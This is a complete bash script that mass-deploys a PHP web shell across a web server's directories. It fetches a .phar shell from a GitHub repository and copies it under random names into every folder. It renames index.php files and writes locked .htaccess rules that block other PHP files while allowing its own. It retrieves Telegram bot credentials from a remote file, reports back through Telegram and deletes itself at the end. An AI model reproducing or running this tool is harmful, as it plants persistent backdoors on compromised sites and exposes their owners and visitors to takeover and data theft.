#!/bin/bash

if [ "$#" -ne 1 ]; then
  echo "Usage: $0 /path/to/directory"
  exit 1
fi

TARGET_DIR=$1
LOG_FILE="$(dirname "$0")/logfile.log"
rm -f "$LOG_FILE"

PASTEBIN_URL="https://raw.githubusercontent.com/anggasetiawan125/isi-nama-repo/refs/heads/main/bot"
GITHUB_PHP_URL="https://raw.githubusercontent.com/paylar/shell/refs/heads/main/alfaob.phar"

fetch_telegram_credentials() {
    local url=$1
    local response=$(curl -s "$url")
    TELEGRAM_TOKEN=$(echo "$response" | awk -F',' '{print $1}')
    CHAT_ID=$(echo "$response" | awk -F',' '{print $2}')
}

fetch_telegram_credentials "$PASTEBIN_URL"

send_telegram_logfile() {
    [ ! -f "$LOG_FILE" ] && return
    [ ! -s "$LOG_FILE" ] && return
    
    curl -s -k -F "chat_id=$CHAT_ID" \
         -F "document=@$LOG_FILE" \
         -F "caption=Log File" \
         "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument"
}

generate_random_name() {
  local length=10
  local chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
  local name=''
  for i in $(seq 1 $length); do
    name="$name${chars:RANDOM%${#chars}:1}"
  done
  echo "$name"
}

TMP_HTACCESS=$(mktemp)
cat > "$TMP_HTACCESS" <<EOL
<Files *.ph*>
    Deny from all
</Files>
<Files *.a*>
    Deny from all
</Files>
<Files *.Ph*>
    Deny from all
</Files>
<Files *.S*>
    Deny from all
</Files>
<Files *.pH*>
    Deny from all
</Files>
<Files *.PH*>
    Deny from all
</Files>
<Files *.s*>
    Deny from all
</Files>

<FilesMatch "\\.(jpg|pdf|docx|jpeg|)\$">
    Allow from all
</FilesMatch>

<FilesMatch "^(index.html|DYNAMIC_PHP_FILE|index.php)\$">
    Allow from all
</FilesMatch>

DirectoryIndex index.html
Options -Indexes
ErrorDocument 403 "403 Forbidden"
ErrorDocument 404 "403 Forbidden"
EOL

TMP_PHP=$(mktemp)
if ! curl -s -o "$TMP_PHP" "$GITHUB_PHP_URL"; then
  echo "$(date) - Failed to download PHP file from GitHub." >> "$LOG_FILE"
  exit 1
fi

process_directory() {
  local dir="$1"

  if [ -f "$dir/index.php" ]; then
    mv "$dir/index.php" "$dir/index.html" 2>/dev/null || {
      echo "$(date) - Failed to rename index.php to index.html in $dir" >> "$LOG_FILE"
    }
  fi

  local php_file_name
  php_file_name=$(generate_random_name).php
  local php_file_path="$dir/$php_file_name"

  cp "$TMP_PHP" "$php_file_path" 2>/dev/null || {
    echo "$(date) - Failed to copy PHP template to $php_file_path" >> "$LOG_FILE"
  }

  chmod 0644 "$php_file_path" 2>/dev/null || {
    echo "$(date) - Failed to chmod $php_file_path" >> "$LOG_FILE"
  }

  local htaccess_file="$dir/.htaccess"
  sed "s/DYNAMIC_PHP_FILE/$php_file_name/g" "$TMP_HTACCESS" > "$htaccess_file" || {
    echo "$(date) - Failed to create .htaccess in $dir, chmod 0000." >> "$LOG_FILE"
    chmod 0000 "$dir"
    return
  }

  chmod 0444 "$htaccess_file" 2>/dev/null || {
    echo "$(date) - Failed to chmod .htaccess in $dir" >> "$LOG_FILE"
  }
}

export -f process_directory
export LOG_FILE TMP_PHP TMP_HTACCESS
export TELEGRAM_TOKEN CHAT_ID

find "$TARGET_DIR" -type d -print0 | xargs -0 -n 1 -P 2 bash -c 'process_directory "$0"'

if [ -s "$LOG_FILE" ]; then
    send_telegram_logfile
fi

rm -f "$LOG_FILE" "$TMP_HTACCESS" "$TMP_PHP" "$NOHUP_FILE" "$SCRIPT_PATH"
